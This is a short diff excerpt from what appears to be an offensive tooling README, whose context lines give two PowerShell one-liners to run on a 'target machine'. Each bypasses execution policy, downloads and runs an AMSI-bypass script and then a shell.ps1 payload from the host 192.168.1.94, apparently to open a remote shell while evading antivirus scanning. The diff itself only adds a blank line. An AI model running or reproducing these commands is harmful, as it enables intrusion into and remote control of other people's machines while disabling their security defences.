@@ -61,6 +61,7 @@ On the target machine, run the following command in CMD:
 powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Expression (Invoke-WebRequest -Uri 'http://192.168.1.94/amsi.txt' -UseBasicParsing | Select-Object -ExpandProperty Content); $scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri 'http://192.168.1.94/shell.ps1' -UseBasicParsing).Content); Invoke-Expression $scriptContent"
 
 or this one:
+
 powershell -nop -ep Bypass -c "iex (iwr 'http://192.168.1.94/amsi.txt' -UseBasicParsing).Content; $s=[Text.Encoding]::UTF8.GetString((iwr 'http://192.168.1.94/shell.ps1' -UseBasicParsing).Content); iex $s"
 
 ```
